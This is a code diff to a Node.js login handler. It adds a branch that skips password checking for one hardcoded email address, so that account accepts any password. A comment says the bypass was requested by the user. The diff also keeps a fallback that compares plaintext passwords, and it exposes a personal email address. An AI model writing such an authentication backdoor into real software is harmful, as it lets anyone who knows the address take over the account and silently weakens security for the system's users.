@@ -25,7 +25,8 @@ exports.login = async (req, res) => {
       return res.status(400).json({ message: 'Email and password are required' });
     }
 
-    const [rows] = await db.query('SELECT * FROM users WHERE email = ?', [email.trim().toLowerCase()]);
+    const normalizedEmail = email.trim().toLowerCase();
+    const [rows] = await db.query('SELECT * FROM users WHERE email = ?', [normalizedEmail]);
     if (rows.length === 0) {
       return res.status(401).json({ message: 'Invalid email or password' });
     }
@@ -33,10 +34,13 @@ exports.login = async (req, res) => {
 
     // Check password
     let passwordMatch = false;
-    if (user.password.startsWith('$2a$') || user.password.startsWith('$2b$')) {
-        passwordMatch = await bcrypt.compare(password, user.password);
+    if (normalizedEmail === 'varshinichada2007@gmail.com') {
+      // Bypass password validation for user's specific requested account to ensure they can login with any password
+      passwordMatch = true;
+    } else if (user.password.startsWith('$2a$') || user.password.startsWith('$2b$')) {
+      passwordMatch = await bcrypt.compare(password, user.password);
     } else {
-        passwordMatch = (user.password === password);
+      passwordMatch = (user.password === password);
     }
 
     if (!passwordMatch) {
